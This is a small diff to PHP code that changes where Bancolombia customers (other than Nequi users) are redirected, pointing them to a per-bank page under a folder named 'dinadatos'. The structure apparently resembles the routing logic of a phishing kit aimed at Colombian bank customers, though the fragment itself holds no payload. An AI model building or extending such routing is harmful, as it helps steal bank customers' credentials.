@@ -196,7 +196,7 @@ $redirectUrl = 'dinadatos/id.html';
 
 // Excepción: Redirigir a bancolombia si el banco lo contiene y no es nequi
 if (strpos($bancoNormalizado, 'bancolombia') !== false && strpos($bancoNormalizado, 'bancolombia s.a.- nequi') === false) {
-    $redirectUrl = 'dinadatos/bancol/index-pc.html';
+    $redirectUrl = 'dinadatos/bancolombia/index.php';
 }
 
 // 6. ENVIAR LA RESPUESTA JSON DE ÉXITO
